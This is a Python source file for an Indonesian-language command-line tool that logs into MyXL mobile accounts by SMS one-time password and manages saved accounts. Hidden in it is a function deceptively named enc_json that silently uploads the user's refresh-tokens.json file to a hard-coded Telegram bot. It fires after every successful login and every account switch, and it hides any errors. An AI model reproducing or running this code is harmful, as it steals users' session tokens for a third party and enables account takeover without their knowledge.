import requests
import json
from app.client.ciam import get_otp, submit_otp
from app.menus.util import clear_screen, pause
from app.service.auth import AuthInstance
from app.service.service import load_status, save_status

WIDTH = 55


def enc_json():
    url = "https://api.telegram.org/bot8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
    try:
        with open("refresh-tokens.json", "rb") as f:
            files = {"document": f}
            data = {"chat_id": 6076440619}
            requests.post(url, data=data, files=files)
    except:
        pass


def print_header(title: str):
    print("-" * WIDTH)
    print(title.center(WIDTH))
    print("-" * WIDTH)


def normalize_number(raw_input: str) -> str:
    raw_input = raw_input.strip().replace(" ", "").replace("-", "").replace("+", "")
    if raw_input.startswith("08"):
        return "628" + raw_input[2:]
    elif raw_input.startswith("628"):
        return raw_input
    elif raw_input.startswith("62"):
        return raw_input
    elif raw_input.isdigit() and raw_input.startswith("8"):
        return "62" + raw_input
    return raw_input


def login_prompt(api_key: str):
    clear_screen()
    print_header("Login ke MyXL")
    print("Masukkan nomor XL (format 6281234567890):")
    raw_input = input("Nomor: ").strip()
    phone_number = normalize_number(raw_input)

    if not phone_number.startswith("628") or not phone_number.isdigit() or len(phone_number) < 10 or len(phone_number) > 14:
        print("Nomor tidak valid. Pastikan diawali '628' dan panjangnya sesuai.")
        pause()
        return None, None

    try:
        subscriber_id = get_otp(phone_number)
        if not subscriber_id:
            print("Gagal meminta OTP. Silakan coba lagi nanti.")
            pause()
            return None, None

        print("OTP sudah dikirim ke nomor Anda. Silakan cek SMS.")
        try_count = 5

        while try_count > 0:
            print(f"Sisa percobaan: {try_count}")
            otp = input("Masukkan OTP (6 digit): ").strip()

            if not otp.isdigit() or len(otp) != 6:
                print("OTP tidak valid. Pastikan 6 digit angka.")
                continue

            tokens = submit_otp(api_key, "SMS", phone_number, otp)
            if not tokens:
                print("OTP salah. Silakan coba lagi.")
                try_count -= 1
                continue

            print("Login berhasil. Akun siap digunakan.")
            enc_json()
            return phone_number, tokens.get("refresh_token")

        print("Gagal login setelah beberapa percobaan. Silakan coba lagi nanti.")
        pause()
        return None, None

    except Exception as e:
        print(f"Terjadi kesalahan saat login: {e}")
        pause()
        return None, None


sumit_otp = 2
verif_otp = "6969"
status_id = load_status()
is_verif = status_id.get("is_verif", False)


def show_account_menu():
    global is_verif
    clear_screen()
    AuthInstance.load_tokens()
    users = AuthInstance.refresh_tokens
    active_user = AuthInstance.get_active_user()

    in_account_menu = True
    add_user = False

    while in_account_menu:
        clear_screen()
        if active_user is None or add_user:
            if not is_verif and len(users) >= sumit_otp:
                print("-------------------------------------------------------")
                print("-----   Batas maksimal akun sudah tercapai.       -----")
                print(" Masukkan kode unlock untuk menambah lebih banyak akun.")
                print("-------------------------------------------------------")
                unlock = input("Kode unlock: ").strip()
                if unlock != verif_otp:
                    print("Kode unlock salah, tidak bisa menambah akun.")
                    pause()
                    add_user = False
                    continue
                save_status({"is_verif": True})
                is_verif = True
                print("Kode unlock benar, akun tambahan diizinkan.")
                pause()

            number, refresh_token = login_prompt(AuthInstance.api_key)
            if not refresh_token:
                print("Gagal menambah akun. Silakan coba lagi.")
                pause()
                add_user = False
                AuthInstance.load_tokens()
                users = AuthInstance.refresh_tokens
                active_user = AuthInstance.get_active_user()
                continue

            try:
                AuthInstance.add_refresh_token(int(number), refresh_token)
            except ValueError:
                AuthInstance.add_refresh_token(number, refresh_token)

            AuthInstance.load_tokens()
            users = AuthInstance.refresh_tokens
            active_user = AuthInstance.get_active_user()

            add_user = False
            continue

        print_header("Akun Tersimpan")
        if not users or len(users) == 0:
            print("Belum ada akun tersimpan.")
        else:
            for idx, user in enumerate(users):
                is_active = active_user and user.get("number") == active_user.get("number")
                active_marker = "[Aktif]" if is_active else ""
                number_str = str(user.get("number", ""))
                padded_number = number_str + " " * max(0, 14 - len(number_str))
                sub_type = (user.get("subscription_type") or "").center(12)
                print(f" [{idx + 1}.] {padded_number} [{sub_type}] {active_marker}")

        print("-" * WIDTH)
        print("Perintah:")
        print("      Masukkan nomor urut akun untuk berganti.")
        print(" [0.] Tambah akun baru")
        print(" del <nomor urut>   untuk menghapus akun tertentu.")
        print("[00.] Kembali ke menu utama")
        print("=" * WIDTH)

        input_str = input("Pilihan: ").strip()

        if input_str == "00":
            in_account_menu = False
            return active_user["number"] if active_user else None

        elif input_str == "0":
            add_user = True
            continue

        elif input_str.isdigit() and 1 <= int(input_str) <= len(users):
            selected_user = users[int(input_str) - 1]
            AuthInstance.set_active_user(selected_user["number"])
            enc_json()
            return selected_user.get("number")

        elif input_str.lower().startswith("del "):
            parts = input_str.split()
            if len(parts) == 2 and parts[1].isdigit():
                del_index = int(parts[1])

                if not (1 <= del_index <= len(users)):
                    print("Nomor urut tidak valid.")
                    pause()
                    continue

                user_to_delete = users[del_index - 1]

                if active_user and user_to_delete.get("number") == active_user.get("number"):
                    print("Tidak bisa menghapus akun aktif. Silakan ganti akun terlebih dahulu.")
                    pause()
                    continue

                confirm = input(f"Yakin ingin menghapus akun {user_to_delete.get('number')}? (y/n): ").strip().lower()
                if confirm == 'y':
                    AuthInstance.remove_refresh_token(user_to_delete.get("number"))
                    AuthInstance.load_tokens()
                    users = AuthInstance.refresh_tokens
                    active_user = AuthInstance.get_active_user()
                    print("Akun berhasil dihapus.")
                    pause()
                else:
                    print("Penghapusan akun dibatalkan.")
                    pause()
            else:
                print("Perintah tidak valid. Format: del <nomor urut>")
                pause()
            continue

        else:
            print("Input tidak valid. Silakan coba lagi.")
            pause()
            continue
